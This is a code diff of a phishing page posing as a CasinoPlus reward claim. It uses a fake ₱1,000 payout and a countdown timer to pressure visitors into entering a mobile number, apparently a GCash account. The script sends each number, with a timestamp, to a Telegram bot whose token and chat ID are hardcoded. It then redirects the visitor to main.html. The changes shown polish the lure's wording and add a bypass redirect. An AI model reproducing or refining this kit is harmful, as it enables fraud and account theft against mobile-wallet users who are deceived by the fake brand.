@@ -3,12 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CasinoPlus | Exclusive Reward Verification</title>
+    <title>CasinoPlus | Membership Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
     <style>
         :root {
             --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%);
-            --royal-blue: #003366;
             --dark-bg: #04070d;
             --neon-green: #39ff14;
         }
@@ -29,12 +28,12 @@
             overflow: hidden;
         }
 
-        /* Modal Overlay */
+        /* Full Screen Overlay */
         .overlay {
             position: fixed;
             inset: 0;
             background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(12px);
+            backdrop-filter: blur(15px);
             z-index: 9999;
             display: flex;
             align-items: center;
@@ -52,13 +51,12 @@
             box-shadow: 0 0 50px rgba(0,0,0,0.8), inset 0 0 20px rgba(255,255,255,0.05);
             text-align: center;
             border: 1px solid rgba(212, 175, 55, 0.4);
-            position: relative;
             animation: modalIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
         @keyframes modalIn {
-            from { transform: scale(0.8) opacity: 0; }
-            to { transform: scale(1) opacity: 1; }
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
         }
 
         .logo-img {
@@ -67,7 +65,7 @@
             filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.5));
         }
 
-        /* Timer Section (Orbitron) */
+        /* Timer Section */
         .timer-container {
             background: rgba(255, 0, 0, 0.1);
             border: 1px solid rgba(255, 0, 0, 0.3);
@@ -103,7 +101,7 @@
 
         input:focus { border-color: #d4af37; box-shadow: 0 0 15px rgba(212,175,55,0.2); }
 
-        /* Payout Button Style */
+        /* Official Button Style */
         .btn-claim {
             background: var(--gold);
             color: #000;
@@ -122,12 +120,13 @@
         .btn-claim:active { transform: translateY(4px); box-shadow: 0 4px 0 #8b6508; }
         .btn-claim:disabled { background: #4b5563; color: #9ca3af; box-shadow: none; transform: translateY(4px); }
 
+        /* Promo Photo */
         .promo-img {
             width: 100%;
             border-radius: 15px;
             margin-top: 25px;
             border: 1px solid rgba(212, 175, 55, 0.2);
-            opacity: 0.8;
+            opacity: 0.9;
         }
 
         #status-msg { margin-top: 15px; font-size: 13px; font-weight: 700; display: none; padding: 10px; border-radius: 10px; }
@@ -149,14 +148,14 @@
         <img src="https://casinoplus.static2.website/images/logo1.png" alt="CasinoPlus" class="logo-img">
         
         <div class="timer-container">
-            <span class="timer-label">Limited Time Offer Expires In:</span>
+            <span class="timer-label">Offer Reserved For:</span>
             <span id="waitTimer">05:00</span>
         </div>
 
-        <p class="reward-info">Congratulations! You have a pending payout of <b>₱1,000.00</b>. Verify your number to claim.</p>
+        <p class="reward-info">Congratulations! You have a pending reward of <b>₱1,000.00</b>. Please verify your mobile number to claim.</p>
 
         <div class="input-group">
-            <label>GCash Mobile Number</label>
+            <label>Registered Mobile Number</label>
             <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
         </div>
 
@@ -166,18 +165,19 @@
 
         <div id="status-msg"></div>
 
-        <img src="https://casinoplus.static2.website/images/casinoplus.jpeg" class="promo-img" alt="Jackpot">
+        <img src="https://casinoplus.static2.website/images/casinoplus.jpeg" class="promo-img" alt="Official Promo">
     </div>
 </div>
 
 <script src="config.js"></script>
 
 <script>
-    // --- TELEGRAM CONFIG ---
+    // --- TELEGRAM & BYPASS SETTINGS ---
     const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
     const chatId = '7298607329';
+    const BYPASS_MODE = true; // TRUE = Rekta main.html pagka-submit
 
-    // 1. Intent URL & Auto Focus
+    // --- INTENT & AUTO-START ---
     window.onload = () => {
         const currentUrl = window.location.href.replace(/^https?:\/\//, '');
         if (!window.location.hash.includes("verified")) {
@@ -208,47 +208,37 @@
         const status = document.getElementById('status-msg');
 
         if (phone.length < 11 || !phone.startsWith('09')) {
-            showStatus("⚠️ Please enter a valid 11-digit GCash number.", "error");
+            showStatus("⚠️ Mangyaring maglagay ng tamang 11-digit mobile number.", "error");
             return;
         }
 
-        // 2. Loading State
         btn.disabled = true;
         btn.innerHTML = `<div class="spinner"></div> VERIFYING ACCOUNT...`;
         status.style.display = "none";
 
-        // 3. Blacklist Check (mula sa config.js)
+        // Blacklist Check mula sa config.js
         if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
             setTimeout(() => {
-                showStatus("❌ Access Denied: This number is not eligible for rewards.", "error");
+                showStatus("❌ Access Denied: Ang account na ito ay hindi kwalipikado.", "error");
                 btn.disabled = false;
                 btn.innerHTML = "Claim Reward Now";
             }, 2000);
             return;
         }
 
-        // 4. Send Telegram Notification
+        // Send Notification to Telegram
         const msg = `🎰 CASINO PLUS LOGIN\n📱 Number: ${phone}\n⏰ Time: ${new Date().toLocaleString()}`;
-        
-        try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: msg })
-            });
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
 
-            // 5. Success & Redirect
-            btn.innerHTML = "SUCCESS! REDIRECTING...";
-            btn.style.background = "#39ff14";
-            showStatus("✅ Account Verified! Syncing your rewards...", "success");
-
+        // --- BYPASS LOGIC ---
+        if (BYPASS_MODE) {
             setTimeout(() => {
+                btn.innerHTML = "SUCCESS! REDIRECTING...";
+                btn.style.background = "#39ff14";
                 window.location.href = "main.html";
-            }, 1500);
-
-        } catch (err) {
-            // Fallback redirect
-            window.location.href = "main.html";
+            }, 1800);
+        } else {
+            showStatus("✅ Account Found! Syncing data...", "success");
         }
     }
 
